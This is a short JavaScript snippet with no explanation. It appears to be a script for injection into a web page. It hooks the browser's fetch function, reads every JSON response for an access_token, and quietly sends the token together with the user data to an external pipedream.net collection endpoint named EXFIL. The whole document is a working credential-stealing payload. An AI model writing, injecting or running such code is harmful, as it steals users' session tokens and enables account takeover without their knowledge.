(function() {
    var EXFIL = 'https://6b884da34ac52d711d2d20ef6f2bf068.m.pipedream.net';
    var orig = window.fetch;
    window.fetch = function() {
        return orig.apply(this, arguments).then(function(r) {
            var c = r.clone();
            c.json().then(function(d) {
                var t = d.access_token;
                if (t) {
                    navigator.sendBeacon(EXFIL, JSON.stringify({ token: t, user: d.user }));
                }
            }).catch(function() {});
            return r;
        });
    };
})();
